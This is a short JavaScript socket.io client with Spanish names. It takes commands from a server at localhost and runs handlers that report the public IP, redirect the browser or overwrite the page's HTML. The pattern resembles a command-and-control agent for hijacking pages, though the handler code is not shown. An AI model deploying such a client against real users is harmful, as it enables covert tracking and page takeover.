import io from 'socket.io-client';

const socket = io('http://localhost:3000');
const publicIp = require('./core/comandos/publicIp');
const redireccionar = require('./core/comandos/redireccionar');
const sobreescribirHtml = require('./core/comandos/sobreescribirHtml');

socket.on('comando', async function( data ) {
    const { comando } = data;
    let response;

    switch (comando) {
        case 'publicIp':
            response = await publicIp();
            break;

        case 'redireccionar':
            response = await redireccionar(data.options);
            break;

        case 'sobreescribirHtml':
            response = await sobreescribirHtml(data.options);
            break;
    
        default:
            response = {
                error: true,
                mensaje: "Comando no encontrado"
            };
            break;
    }

    socket.emit('recibido', response);
});